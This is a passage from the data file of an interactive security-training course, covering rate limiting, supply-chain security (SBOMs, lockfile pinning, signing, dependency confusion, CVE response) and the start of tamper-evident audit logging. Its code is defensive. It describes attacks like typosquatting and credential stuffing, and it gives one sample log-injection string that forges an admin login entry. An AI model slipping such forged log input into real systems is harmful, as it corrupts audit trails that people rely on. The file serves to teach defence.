    { lang: 'java', check: false, title: 'Redis fixed-window counter (Lua, atomic)', code: `-- KEYS[1] = "rl:user:42:minute:2026101510"  ARGV[1] = limit  ARGV[2] = ttl seconds\nlocal c = redis.call('INCR', KEYS[1])\nif c == 1 then redis.call('EXPIRE', KEYS[1], ARGV[2]) end\nif c > tonumber(ARGV[1]) then return 0 else return 1 end` }
  ],
  codeTitle: ['JS: sliding window', 'Python: token bucket', 'Java: login backoff', 'Redis Lua'],
  viz: {
    title: 'Sliding-window limiter: 3 requests per 1000 ms',
    input: '0 100 200 300 900 1050 1150 1300',
    inputLabel: 'Request times in ms (increasing)',
    gen: function (input) {
      var ts = String(input).trim().split(/[\s,]+/).map(Number);
      if (!ts.length || ts.some(isNaN) || ts.length > 14) throw new Error('Enter up to 14 increasing times in ms, e.g. 0 100 200 300');
      var LIMIT = 3, W = 1000, win = [], frames = [], log = [], hl = {}, i;
      frames.push({ narr: 'Rule: at most <b>' + LIMIT + '</b> requests in any <b>' + W + ' ms</b> window. We keep the timestamps of accepted requests.', parts: [{ type: 'queue', label: 'Window (accepted timestamps)', items: [], frontLabel: 'oldest', backLabel: 'newest' }] });
      for (i = 0; i < ts.length; i++) {
        var t = ts[i], dropped = [];
        while (win.length && win[0] <= t - W) dropped.push(win.shift());
        var ok = win.length < LIMIT;
        if (ok) win.push(t);
        log.push(['t=' + t, ok ? 'allowed' : '429 Retry-After ' + (win[0] + W - t) + 'ms', win.join(', ') || '-']);
        hl = {}; hl[log.length - 1] = ok ? 'ok' : 'bad';
        var qh = {}; if (ok) qh[win.length - 1] = 'ok';
        frames.push({ narr: 'Request at <b>' + t + ' ms</b>. ' + (dropped.length ? 'Expired timestamps removed: ' + dropped.join(', ') + '. ' : '') + (ok ? 'Window has room, <span class="c-g">allowed</span>.' : 'Window already holds ' + LIMIT + ' requests, <span class="c-r">rejected with 429</span>.'), parts: [{ type: 'queue', label: 'Window (accepted timestamps)', items: win.slice(), hl: qh, frontLabel: 'oldest', backLabel: 'newest' }, tbl(['Request', 'Result', 'Window after'], log.slice(), JSON.parse(JSON.stringify(hl)))] });
      }
      return frames;
    }
  },
  examples: [
    { title: 'Fixed window boundary burst', html: `<p>Limit 100/min with fixed windows: a client sends 100 at 12:00:59 and 100 at 12:01:00 = <b>200 in two seconds</b>, both allowed. Sliding window (or token bucket) removes this loophole.</p>` },
    { title: 'Stop OTP brute force', html: `<p>A 6-digit OTP has only 1,000,000 values. Allow 5 attempts per code, then invalidate the code and require a new one; limit code requests per phone number (3 per hour) and per IP; log and alert on bursts. Without limits an attacker can try all values in minutes.</p>` },
    { title: 'Return useful headers', html: `<p>Send <code>429</code> with <code>Retry-After: 12</code> and (optionally) <code>RateLimit-Limit</code>, <code>RateLimit-Remaining</code>, <code>RateLimit-Reset</code>. Good clients back off with jitter; bad clients are identified by ignoring it.</p>`, code: { lang: 'http', code: `HTTP/1.1 429 Too Many Requests\nRetry-After: 12\nContent-Type: application/json\n\n{"error":"rate_limited","message":"Try again in 12 seconds"}` } }
  ],
  deepDive: `<p>🟣 <b>Distributed correctness.</b> Read-modify-write across two app servers races; use Redis atomic scripts or <code>INCR</code>. A single hot key (one abusive client) can overload one Redis shard; shard by key and add local pre-filtering. Clock skew: use the store's clock (Redis <code>TIME</code>) not each server's. Sliding window log costs O(limit) memory per key; the sliding counter approximates with two counters: <code>count = prev * (1 - elapsed/window) + current</code>. Token bucket in Redis stores <code>tokens</code> and <code>last_refill</code> in a hash updated by a Lua script.</p>
  <p><b>Abuse beyond rate.</b> Attackers distribute across thousands of IPs (botnets, residential proxies), so layer defences: per-account limits, proof of work or CAPTCHA/Turnstile for risky actions, bot scoring, device signals, breached-password checks, anomaly detection (new geo + high rate), and business rules (max 3 coupon redemptions per account). <b>Pitfalls:</b> limiting only by IP (shared NAT blocks innocent users; attackers rotate), trusting <code>X-Forwarded-For</code> from untrusted clients (use only the proxy-appended value), lockouts that let attackers lock out victims (prefer throttling), counting rejected requests inconsistently, and no limit on expensive GraphQL queries (limit depth and cost). <b>Capacity vs security:</b> load shedding and request timeouts, bulkheads, and circuit breakers protect the system even when the limiter fails.</p>`,
  aiEra: `<p>🤖 <b>What AI changes:</b> AI scrapers and agents generate huge, human-looking request volumes, and LLM endpoints are expensive per call, so <b>cost-based limits</b> (tokens per minute, spend caps per key) become as important as request counts. Attackers use AI to solve simple CAPTCHAs and craft adaptive credential-stuffing, so rely on layered signals, not one gate. Your own agents can DoS your services in a retry loop: give them budgets, backoff with jitter, and honour <code>Retry-After</code>. <b>Use AI as a partner:</b> generate load-test scenarios and simulate abuse patterns; ask it to review a limiter for boundary and race conditions. <b>Where AI goes wrong:</b> proposes an in-memory per-server counter for a multi-server fleet, so the real limit is N times larger. <b>You still own:</b> choosing keys, limits and failure modes from real traffic data.</p>`,
  problems: [
    P('Design a Distributed Rate Limiter for Login and API', 'Medium', ['rate limiting', 'abuse', 'redis'],
      `<p>Design a rate limiter used by 20 API servers. Requirements: 100 requests/minute per API key; 5 login attempts per 15 minutes per account; handle bursts; survive a Redis outage; return proper headers. Explain algorithm choice, data model, atomicity and failure behaviour.</p>`,
      `1M API keys; p99 added latency under 2 ms; accounts targeted by botnets using many IPs.`,
      `<p>Request 101 in a minute -> ${H.c('r', '429 + Retry-After')}; 6th wrong password for one account from 6 different IPs -> ${H.c('r', 'throttled')}.</p>`,
      `<p>Each server keeps its own in-memory counter. With 20 servers a client really gets up to 2000/min, counters reset on deploy, and login attacks that rotate IPs are never connected to the victim account.</p>`,
      { q: 'Why key the login limiter on the account as well as IP?', options: ['IPs are always unique', 'Botnets rotate IPs against one victim', 'It is faster', 'Accounts never change'], answer: 1, explain: 'An attacker with many IPs bypasses per-IP limits; the account key links the attempts.' },
      [`<p>Hint 1: two different limits need two different keys and algorithms.</p>`, `<p>Hint 2: use a token bucket for APIs (bursts), a counter with backoff for logins, state in Redis updated by one Lua script.</p>`, `<p>Hint 3: define fail-open for read APIs, fail-closed/degraded for login, and add local fallback limits.</p>`],
      `<p>API limit: token bucket per API key, capacity 120 and refill 100/min (2 extra for bursts). State: Redis hash {tokens, ts}. A Lua script computes refill from the Redis clock, takes a token and returns allowed, remaining and reset, so check-and-update is atomic across 20 servers. Key is hashed per API key with a hash tag so one key lives on one shard; TTL equals the time to refill fully. Headers: RateLimit-Limit/Remaining/Reset and Retry-After on 429. Login: key = account id (normalised email) plus a second key by IP; allow 5 failures per 15 minutes then exponential backoff (never a hard permanent lock) and require CAPTCHA or email verification; failed-attempt counters are reset on success. Add global signals: many accounts failing from one IP/ASN, same password across accounts (stuffing), breached-password check. Failure modes: when Redis is down, read APIs fail open with a small per-process fallback limit (e.g. 20% of normal) while login fails closed to a strict local limit and extra verification. Performance: one Redis round trip, pipelined, about 0.5 ms; hot keys are protected by a local cache that rejects already-blocked keys. Observability: metrics for allowed/blocked per route, alerts on spikes, and a dashboard for abusive keys with an admin override.</p>`,
      `<p>O(1) time and memory per key; one network round trip per request.</p>`, ['How would you rate limit by cost (LLM tokens) instead of request count?', 'How do you test the limiter under clock skew?'])
  ]
});

/* =========================================================
   TOPIC 8 — Supply chain, vulnerable components, integrity
   ========================================================= */
topics.push({
  title: 'Supply-Chain Security: Vulnerable Components, SBOM, Pinning & Signing (A06, A08)',
  analogy: `<p>A restaurant is only as safe as its <b>suppliers</b>. If the flour company mixes in something nasty, your perfect kitchen still poisons customers. Modern apps are 80-90% other people's code: libraries, base images, build tools, CI plugins. An <b>SBOM</b> is the ingredient label on your product. <b>Pinning</b> is "always buy flour batch #4417, not whatever arrives". <b>Signing</b> is the tamper seal that proves the sack came from the real mill and was not opened on the truck.</p>`,
  explain: `<p>🟢 <b>The risks.</b> (1) <b>Vulnerable and outdated components (A06):</b> you use a library with a known flaw (the Log4Shell lesson: one logging library, millions of servers). (2) <b>Software and data integrity failures (A08):</b> you run code or data whose origin you did not verify - unsigned updates, auto-updating plugins, insecure deserialization, CI/CD pipelines anyone can modify. (3) <b>Malicious packages:</b> typosquatting (<code>requets</code>), <b>dependency confusion</b> (a public package with the same name as your private one and a higher version), hijacked maintainer accounts, and "protestware".</p>
  <p>🔵 <b>Defences, one by one.</b></p>
  ${H.table(['Control', 'What it does', 'Tools'], [
    ['SBOM', 'Machine-readable list of every component and version, so you can answer "are we affected?" in minutes', 'CycloneDX, SPDX, Syft'],
    ['Vulnerability scanning (SCA)', 'Match SBOM/lockfile against CVE databases; fail the build on severity', 'Dependabot, Renovate, OSV-Scanner, Trivy, Grype'],
    ['Pinning + lockfiles', 'Exact versions and hashes so builds are reproducible and cannot silently change', 'package-lock.json, poetry.lock, Gradle dependency locking, <code>--require-hashes</code>'],
    ['Private registry / proxy', 'One controlled entry point; block unknown names and confusion attacks', 'Artifactory, Nexus, scoped packages'],
    ['Signing + provenance', 'Prove who built an artifact and from which commit; verify before deploy', 'Sigstore cosign, SLSA provenance, in-toto'],
    ['Hardened CI/CD', 'Least-privilege tokens, pinned actions by commit SHA, protected branches, no secrets for forks', 'OIDC federation, branch protection, required review'],
    ['Minimal images', 'Fewer packages = fewer CVEs', 'distroless, Alpine, multi-stage builds']
  ])}
  <p>🔴 <b>Transitive dependencies are the problem.</b> You declare 20 libraries but ship 400, because each pulls others. The vulnerable one is usually 3 levels deep. You need the <i>dependency tree</i> (<code>mvn dependency:tree</code>, <code>npm ls</code>, <code>pip-tree</code>) and a policy to override the transitive version (dependency management / overrides / resolutions).</p>
  <p>🟣 <b>Patch speed is the metric.</b> Time from CVE published to fixed in production. Use reachability analysis (is the vulnerable function actually called?) to prioritise, but do not skip updates because "we do not call it".</p>`,
  clues: [
    '"a CVE was announced in a library" / "Log4Shell" - SBOM lookup, transitive tree, patch, override, redeploy',
    '"how do you secure the CI/CD pipeline?" - least privilege, pinned actions, signed artifacts, protected branches',
    '"dependency confusion" / "typosquatting" - scoped names, private registry priority, hash pinning',
    '"reproducible builds" / "lockfile" / "pin versions" - integrity and repeatability',
    '"SBOM" / "SLSA" / "Sigstore" / "provenance"',
    '"deserialization of untrusted data" - integrity failure; use data-only formats with schemas'
  ],
  code: [
    { lang: 'python', run: true, title: 'Runnable: lockfile hash check + vulnerable-version match', code: `import hashlib

# 1) INTEGRITY: the lockfile pins the sha256 of each artifact; refuse anything that differs.
good_bytes = b'pretend this is json-lib-1.4.2.tar.gz'
lock = {'json-lib': {'version': '1.4.2', 'sha256': hashlib.sha256(good_bytes).hexdigest()}}

def verify(name, data):
    expected = lock[name]['sha256']
    actual = hashlib.sha256(data).hexdigest()
    return actual == expected

print('untampered download ok? ', verify('json-lib', good_bytes))
print('tampered download ok?   ', verify('json-lib', good_bytes + b' + backdoor'))

# 2) SCA: match an SBOM (name -> version) against an advisory list (fictional package names).
def parse(v): return tuple(int(x) for x in v.split('.'))
advisories = [{'pkg': 'xml-util', 'fixed_in': '3.1.0', 'id': 'EXAMPLE-2026-0001', 'severity': 'critical'}]
sbom = {'app-core': '2.0.0', 'json-lib': '1.4.2', 'xml-util': '3.0.4'}     # includes transitive deps
for adv in advisories:
    v = sbom.get(adv['pkg'])
    if v and parse(v) < parse(adv['fixed_in']):
        print('VULNERABLE:', adv['pkg'], v, '->', adv['id'], adv['severity'], '- upgrade to', adv['fixed_in'])` },
    { lang: 'yaml', check: false, title: 'GitHub Actions: least privilege + pin by commit SHA + scan + sign', code: `name: build\non: { push: { branches: [main] } }\npermissions:\n  contents: read            # default token can only read\n  id-token: write           # needed for keyless signing via OIDC (no stored secret)\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@0123456789abcdef0123456789abcdef01234567   # pinned to a full commit SHA, not a movable tag\n      - run: ./gradlew build --write-locks=false     # use committed lockfile; fail on drift\n      - run: syft . -o cyclonedx-json > sbom.json      # produce the SBOM\n      - run: grype sbom:sbom.json --fail-on high       # break the build on high CVEs\n      - run: cosign sign --yes $IMAGE_DIGEST           # sign the image by digest` },
    { lang: 'bash', check: false, title: 'Pin and verify dependencies', code: `# Python: refuse any package without a matching hash\npip install --require-hashes -r requirements.txt\n\n# Node: install exactly what the lockfile says, never "latest"\nnpm ci --ignore-scripts\n\n# Java/Maven: see why a vulnerable library is on the classpath\nmvn dependency:tree -Dincludes=org.example:xml-util\n\n# Containers: verify the signature before deploying\ncosign verify --certificate-identity-regexp 'https://github.com/myorg/.*' \\\n  --certificate-oidc-issuer https://token.actions.githubusercontent.com registry.example.com/shop/api@sha256:DIGEST` },
    { lang: 'java', title: 'Safer data handling: never deserialize untrusted Java objects', code: `import java.io.*;
import java.util.*;

public class SafeInput {
    /** Accept data-only text with a strict shape instead of ObjectInputStream on untrusted bytes. */
    static Map<String, String> parseKeyValue(String line) {
        Map<String, String> out = new LinkedHashMap<>();
        for (String part : line.split(";")) {
            String[] kv = part.split("=", 2);
            if (kv.length != 2 || !kv[0].matches("[a-z]{1,20}") || kv[1].length() > 100) {
                throw new IllegalArgumentException("bad field");
            }
            out.put(kv[0], kv[1]);
        }
        return out;
    }
    public static void main(String[] args) {
        System.out.println(parseKeyValue("name=asha;plan=pro"));
        try { parseKeyValue("name=asha;../x=1"); } catch (IllegalArgumentException e) { System.out.println("rejected"); }
    }
}` }
  ],
  codeTitle: ['Python: hash pin + SCA match', 'CI: pinned, scanned, signed', 'Shell: pin and verify', 'Java: data-only input'],
  viz: {
    title: 'Dependency tree: find the vulnerable package and its path',
    input: '5',
    inputLabel: 'Index of the vulnerable node in the tree (1-6)',
    gen: function (input) {
      var v = parseInt(String(input).trim(), 10);
      if (isNaN(v) || v < 1 || v > 6) throw new Error('Enter a number 1 to 6');
      var arr = ['my-app', 'web-framework', 'orm-lib', 'json-lib', 'xml-util 3.0.4', 'log-lib', 'crypto-lib'];
      // level order: 0 app; 1,2 children; 3,4 under 1; 5,6 under 2
      var parent = { 1: 0, 2: 0, 3: 1, 4: 1, 5: 2, 6: 2 };
      var path = [], n = v;
      while (n !== 0) { path.push(n); n = parent[n]; }
      path.push(0);
      var frames = [], hl = {}, i, ehl = {};
      frames.push({ narr: 'Your app declares <b>2</b> direct dependencies but pulls in more <b>transitive</b> ones. The SBOM lists the whole tree.', parts: [{ type: 'tree', label: 'Dependency tree (SBOM view)', arr: arr, hl: {} }] });
      for (i = 1; i < arr.length; i++) {
        hl = {}; hl[i] = i === v ? 'bad' : 'cur';
        frames.push({ narr: 'Scanner checks <b>' + arr[i] + '</b> against the advisory database. ' + (i === v ? '<span class="c-r">MATCH: known critical vulnerability (fixed in a newer version).</span>' : 'No known issue.'), parts: [{ type: 'tree', label: 'Dependency tree', arr: arr, hl: hl }] });
        if (i === v) break;
      }
      hl = {}; ehl = {};
      path.forEach(function (p, k) { hl[p] = p === v ? 'bad' : 'win'; if (p !== 0) ehl[p] = 'bad'; });
      frames.push({ narr: 'Why is it in your app? Follow the path up to the root: <b>' + path.slice().reverse().map(function (p) { return arr[p]; }).join(' -> ') + '</b>. You did not choose it directly, but you ship it.', parts: [{ type: 'tree', label: 'Path to the vulnerable package', arr: arr, hl: hl, ehl: ehl }] });
      var fixed = arr.slice(); fixed[v] = arr[v].replace(/ [\d.]+$/, '') + ' (patched)';
      hl = {}; hl[v] = 'ok';
      frames.push({ narr: '<b>Fix:</b> upgrade the parent, or pin/override the transitive version in your build (dependencyManagement / overrides), regenerate the lockfile, rebuild, re-scan, redeploy.', parts: [{ type: 'tree', label: 'After the override', arr: fixed, hl: hl }] });
      frames.push({ narr: 'Prevent repeats: scanner in CI that fails on high severity, automated update PRs, an SBOM stored for each release so "are we affected?" takes minutes.', parts: [{ type: 'text', html: '<b>Metric:</b> time from advisory published to fix running in production.' }] });
      return frames;
    }
  },
  examples: [
    { title: 'Respond to a critical CVE announcement', html: `<p>Hour 0: query SBOMs for the package and version range (which services are affected?). Hour 1: confirm reachability and exposure (internet-facing first), apply a mitigation if a patch is not ready (WAF rule, config flag, disable the feature). Hour 2-6: upgrade or override the version, test, deploy in priority order. Day 1: verify with a scan and runtime inventory, check logs for exploitation attempts (look back in time), write the summary.</p>` },
    { title: 'Stop dependency confusion', html: `<p>Internal package <code>acme-billing</code> exists only in your private registry. An attacker publishes <code>acme-billing 99.0.0</code> to the public registry; a misconfigured build picks the highest version. <b>Fix:</b> use scoped names (<code>@acme/billing</code>), configure the registry so internal names resolve only to the private source, enable hash pinning, and reserve your names publicly.</p>` },
    { title: 'Secure the build pipeline', html: `<p>Attackers target CI because it holds deploy credentials. Use: short-lived OIDC credentials (no stored cloud keys), separate build and deploy permissions, branch protection + required reviews, pin third-party actions by commit SHA, no secrets exposed to pull requests from forks, ephemeral isolated runners, and verify signatures/provenance at deploy time (admission controller).</p>` }
  ],
  deepDive: `<p>🟣 <b>SLSA</b> (Supply-chain Levels for Software Artifacts) grades build integrity: L1 documented provenance, L2 hosted build service signs provenance, L3 hardened isolated builds with non-forgeable provenance. <b>Sigstore</b> offers keyless signing: a short-lived certificate (Fulcio) is bound to your OIDC identity and the signature is recorded in a public transparency log (Rekor), so no long-lived signing key to steal. Verification policy: "this image digest was built by workflow X in repo Y from branch main". Deploy by <b>digest</b> (sha256) not mutable tag, since tags can be re-pointed.</p>
  <p><b>Reproducible builds</b> let independent parties rebuild and get bit-identical output, exposing a tampered build system. <b>Lockfile discipline:</b> commit lockfiles, review lockfile diffs, use <code>npm ci</code>, disable install scripts when possible (they run arbitrary code at install time), and use a cooldown (do not adopt versions newer than a few days to dodge fresh malicious releases). <b>VEX</b> statements record "affected / not affected" per CVE so scanner noise can be justified. <b>Deserialization</b>: Java <code>ObjectInputStream</code>, Python <code>pickle</code>, YAML <code>load</code> can execute code from crafted input; use JSON with schema validation, or an allow-list filter (<code>ObjectInputFilter</code>). <b>Integrity also covers</b> unsigned updates and CDN scripts - use Subresource Integrity (<code>integrity="sha384-..."</code>) for third-party scripts. <b>Real incidents to know:</b> SolarWinds (build compromise), event-stream and ua-parser-js (maintainer takeover), Codecov bash uploader (modified script), xz backdoor (long-term social engineering of a maintainer), the Log4Shell scramble. Lesson: assume some dependency will be bad; limit privileges, network and secrets in your build and runtime.</p>`,
  aiEra: `<p>🤖 <b>What AI changes:</b> Coding assistants <b>hallucinate package names</b>; attackers register those names with malware ("slopsquatting"). An agent that runs <code>pip install</code> or <code>npm install</code> on its own can pull a malicious package straight into your environment. AI models, datasets and plugins are supply chain too: unsafe model formats (pickle-based weights) can run code when loaded, so prefer safetensors, pin model versions by hash, scan them, and generate an <b>AI BOM</b>. MCP servers and agent "skills" are third-party code with tool access: review, pin and sandbox them. <b>Use AI as a partner:</b> summarise a changelog or lockfile diff, explain a CVE and write a regression test for the vulnerable path - then verify with the real advisory. <b>Where AI goes wrong:</b> suggests an old library version it remembers, or says "this CVE does not apply" without checking reachability. <b>You still own:</b> approval of new dependencies, pinning policy and the incident process.</p>`,
  problems: [
    P('A Critical CVE Hits a Transitive Dependency', 'Medium', ['sbom', 'sca', 'incident'],
      `<p>Friday 17:00: an advisory reports remote code execution in <code>xml-util &lt; 3.1.0</code>. You own 60 services in Java, Node and Python. Describe how you find affected services, mitigate, patch, verify, and prevent a repeat.</p>`,
      `No one remembers which services use the library; some use it only transitively.`,
      `<p>Goal: answer "which services, which versions, exposed to the internet?" within 30 minutes.</p>`,
      `<p>Ask each team in chat to check their code manually and reply by Monday. Slow, incomplete (transitive use is invisible), and attackers move within hours.</p>`,
      { q: 'What lets you answer "are we affected?" fastest?', options: ['Email every team', 'Stored SBOMs per release, searchable', 'Read all source code', 'Wait for the scanner next week'], answer: 1, explain: 'An SBOM per build is a searchable inventory, including transitive packages.' },
      [`<p>Hint 1: inventory first - what is deployed and what is inside it?</p>`, `<p>Hint 2: prioritise by exposure (internet-facing, handles untrusted XML) and available mitigations.</p>`, `<p>Hint 3: fix through the build (override transitive version), then verify in the running fleet and add prevention.</p>`],
      `<p>Step 1 inventory: query the SBOM store (CycloneDX per image digest) for xml-util below 3.1.0; if none exists, run Syft/Trivy against every deployed image and the lockfiles in the repos, and publish a live list within 30 minutes. Step 2 triage: tag services as internet-facing, parse untrusted XML, or internal-only. Step 3 mitigate now: a WAF rule for the known exploit pattern, disable the XML feature behind a flag, restrict egress for the process, and raise detection (log search for exploit strings across the exposure window, since attackers start before patches ship). Step 4 patch: bump the direct dependency if it has a fixed release, otherwise force the transitive version (Maven dependencyManagement, npm overrides, pip constraints), regenerate lockfiles, run tests, build once, deploy exposed services first using canary rollouts. Step 5 verify: rescan deployed images by digest, confirm in a runtime inventory that no old pods remain, close the incident only when the count is zero. Step 6 prevent: scanner gate in CI, automated update PRs with weekly cadence, SBOM stored on every release, base image rebuilds on a schedule, and a metric for time-to-patch with an SLA per severity.</p>`,
      `<p>Querying an indexed SBOM store is O(services); the work is in coordination, not computation.</p>`, ['How do you decide a CVE is not reachable and safe to defer?', 'How would you handle a vendor library with no fixed release?'])
  ]
});

/* =========================================================
   TOPIC 9 — Audit logging & logging failures
   ========================================================= */
topics.push({
  title: 'Audit Logging & Tamper-Evident Logs (A09: Logging & Monitoring Failures)',
  analogy: `<p>A bank vault has a <b>guest book</b> bound with numbered pages. Every visitor writes name, time and reason. If someone wants to hide a visit they cannot just tear out a page - the next page's number would be missing, and each page also repeats a mark copied from the previous page. A <b>hash-chained audit log</b> is that book: every entry contains a fingerprint of the entry before it, so changing or deleting anything breaks every fingerprint after it, and the break is obvious.</p>`,
  explain: `<p>🟢 <b>Two kinds of logs.</b> <b>Application logs</b> help developers debug (errors, timings). <b>Audit logs</b> are a security and compliance record of <i>who did what to which thing, when, from where, and with what result</i>: logins, permission changes, data exports, deletions, admin actions, denied requests. A09 (Logging and Monitoring Failures) is when these are missing, too thin to investigate, never reviewed, or editable by the attacker. The average breach goes unnoticed for months mostly for this reason.</p>
  <p>🔵 <b>What a good audit entry holds</b> (the "5 Ws"): <b>who</b> (user id, service, session id), <b>what</b> (action, resource id, old and new values summary), <b>when</b> (UTC timestamp with timezone), <b>where</b> (IP, device, service name, request id/trace id), <b>result</b> (success/denied + reason). <b>Never log</b> passwords, tokens, full card numbers, session cookies, or secrets - and be careful with personal data (log ids, not raw PII). Neutralise newlines in user input to stop <b>log injection / forging</b> (<code>\\n2026-01-01 admin LOGIN OK</code>).</p>
  <p>🔴 <b>Tamper evidence with hash chaining.</b> Each entry stores <code>prevHash</code> and its own <code>hash = SHA-256(prevHash + canonical entry data)</code>. To verify, recompute from the first entry: if any record was edited, inserted or removed, a recomputed hash will not match the stored one, and every later hash is also wrong. For stronger guarantees: store the latest hash (the "head") somewhere the attacker cannot reach (a separate account, WORM storage like S3 Object Lock, a transparency log, or periodic signed checkpoints), and use <b>HMAC</b> or signatures so an attacker who can edit the file cannot simply recompute the chain.</p>
  <p>🟣 <b>Detection is the point.</b> Logs nobody reads do not help. Centralise (SIEM), alert on patterns: repeated failures, privilege changes, access outside hours, large exports, first-time access to a sensitive table, log gaps, and verification failure of the chain.</p>`,
  clues: [
    '"audit log" / "who changed this record?" / "compliance (SOX, HIPAA, PCI)" - append-only, immutable, retained',
    '"tamper-proof / tamper-evident logs" - hash chain, HMAC/signatures, WORM storage, external anchor',
    '"what should we log, and what never?" - 5 Ws yes; secrets, tokens, raw PII no',
    '"attacker deleted the logs" - ship logs off-host immediately, append-only permissions',
    '"log injection" / "log forging" - sanitize CR/LF, use structured JSON logging',
    '"how would you detect a breach?" - alerting on audit events, correlation ids, SIEM'
  ],
  code: [
    { lang: 'js', run: true, title: 'Runnable: hash-chained audit log with tamper detection', code: `// SHA-256 written out in plain JavaScript (FIPS 180-4), so this demo uses a real
// cryptographic hash in every runtime: Node, the browser sandbox, or anywhere else.
// In production use the platform's crypto: require('crypto') in Node, crypto.subtle in browsers.
function sha256(text) {
  const K = new Uint32Array([0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,
    0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3, 0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174, 0xe49b69c1, 0xefbe4786,
    0x0fc19dc6, 0x240ca1cc, 0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da, 0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7,
    0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967, 0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13, 0x650a7354, 0x766a0abb,
    0x81c2c92e, 0x92722c85, 0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3, 0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,
    0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3, 0x748f82ee, 0x78a5636f,
    0x84c87814, 0x8cc70208, 0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2]);
  const H = new Uint32Array([0x6a09e667, 0xbb67ae85, 0x3c6ef372, 0xa54ff53a, 0x510e527f, 0x9b05688c, 0x1f83d9ab, 0x5be0cd19]);
  const data = new TextEncoder().encode(text), len = data.length, total = Math.ceil((len + 9) / 64) * 64;
  const m = new Uint8Array(total); m.set(data); m[len] = 0x80;              // message + 1 bit + zero padding
  const dv = new DataView(m.buffer);
  dv.setUint32(total - 8, Math.floor(len / 0x20000000)); dv.setUint32(total - 4, (len * 8) >>> 0); // length in bits
  const w = new Uint32Array(64), rot = (x, n) => (x >>> n) | (x << (32 - n));
  for (let off = 0; off < total; off += 64) {
    for (let i = 0; i < 16; i++) w[i] = dv.getUint32(off + i * 4);
    for (let i = 16; i < 64; i++) {
      const s0 = rot(w[i - 15], 7) ^ rot(w[i - 15], 18) ^ (w[i - 15] >>> 3), s1 = rot(w[i - 2], 17) ^ rot(w[i - 2], 19) ^ (w[i - 2] >>> 10);
      w[i] = (w[i - 16] + s0 + w[i - 7] + s1) >>> 0;
    }
    let [a, b, c, d, e, f, g, h] = H;
    for (let i = 0; i < 64; i++) {
      const t1 = (h + (rot(e, 6) ^ rot(e, 11) ^ rot(e, 25)) + ((e & f) ^ (~e & g)) + K[i] + w[i]) >>> 0;
      const t2 = ((rot(a, 2) ^ rot(a, 13) ^ rot(a, 22)) + ((a & b) ^ (a & c) ^ (b & c))) >>> 0;
      h = g; g = f; f = e; e = (d + t1) >>> 0; d = c; c = b; b = a; a = (t1 + t2) >>> 0;
    }
    H[0] += a; H[1] += b; H[2] += c; H[3] += d; H[4] += e; H[5] += f; H[6] += g; H[7] += h;   // Uint32Array wraps mod 2^32
  }
  return Array.from(H, (x) => x.toString(16).padStart(8, '0')).join('');
}
console.log('SHA-256 self-test (official "abc" vector):', sha256('abc') === 'ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad');

const GENESIS = '0'.repeat(64);                                       // 64 hex characters = 256 bits
class AuditLog {
  constructor() { this.entries = []; }
  append(actor, action, resource, result) {
    const prevHash = this.entries.length ? this.entries[this.entries.length - 1].hash : GENESIS;
    const body = { seq: this.entries.length, ts: '2026-10-15T10:0' + this.entries.length + ':00Z', actor, action, resource, result };
    const hash = sha256(prevHash + JSON.stringify(body));          // chain: includes the previous hash
    this.entries.push({ ...body, prevHash, hash });
  }
  verify() {                                                         // returns index of first bad entry, or -1
    let prev = GENESIS;
    for (let i = 0; i < this.entries.length; i++) {
      const { prevHash, hash, ...body } = this.entries[i];
      if (prevHash !== prev || sha256(prevHash + JSON.stringify(body)) !== hash) return i;
      prev = hash;
    }
    return -1;
  }
}
const log = new AuditLog();
log.append('asha', 'LOGIN', 'session', 'ok');
log.append('asha', 'EXPORT', 'customers.csv', 'ok');
log.append('ben', 'DELETE', 'invoice:205', 'denied');
log.append('asha', 'ROLE_CHANGE', 'user:ben', 'ok');
console.log('intact chain, first bad index:', log.verify());
log.entries[1].actor = 'nobody';                                    // attacker edits who exported the data
console.log('after editing entry 1, first bad index:', log.verify());
log.entries[1].actor = 'asha';                                      // restore
log.entries.splice(2, 1);                                           // attacker deletes the denied-delete record
console.log('after deleting entry 2, first bad index:', log.verify());` },
    { lang: 'java', title: 'Java: hash-chained entry creation and verification', code: `import java.security.MessageDigest;
import java.util.*;

public class AuditChain {
    record Entry(int seq, String actor, String action, String prevHash, String hash) {}

    static String sha256(String s) throws Exception {
        byte[] d = MessageDigest.getInstance("SHA-256").digest(s.getBytes("UTF-8"));
        StringBuilder sb = new StringBuilder();
        for (byte b : d) sb.append(String.format("%02x", b));
        return sb.toString();
    }
    static Entry next(List<Entry> log, String actor, String action) throws Exception {
        String prev = log.isEmpty() ? "GENESIS" : log.get(log.size() - 1).hash();
        // Delimiters keep field boundaries unambiguous ("a|bc" vs "ab|c").
        String h = sha256(prev + "|" + log.size() + "|" + actor + "|" + action);
        return new Entry(log.size(), actor, action, prev, h);
    }
    static int firstBad(List<Entry> log) throws Exception {
        String prev = "GENESIS";
        for (int i = 0; i < log.size(); i++) {
            Entry e = log.get(i);
            String expect = sha256(prev + "|" + e.seq() + "|" + e.actor() + "|" + e.action());
            if (!e.prevHash().equals(prev) || !e.hash().equals(expect)) return i;
            prev = e.hash();
        }
        return -1;
    }
    public static void main(String[] args) throws Exception {
        List<Entry> log = new ArrayList<>();
        log.add(next(log, "asha", "LOGIN"));
        log.add(next(log, "asha", "EXPORT"));
        log.add(next(log, "ben", "DELETE"));
        System.out.println("intact: " + firstBad(log));
        Entry e = log.get(1);
        log.set(1, new Entry(e.seq(), "mallory", e.action(), e.prevHash(), e.hash()));   // tamper
        System.out.println("tampered at index: " + firstBad(log));
    }
}` },
    { lang: 'python', run: true, title: 'Runnable: safe structured audit line (no log forging, no secrets)', code: `import json, re

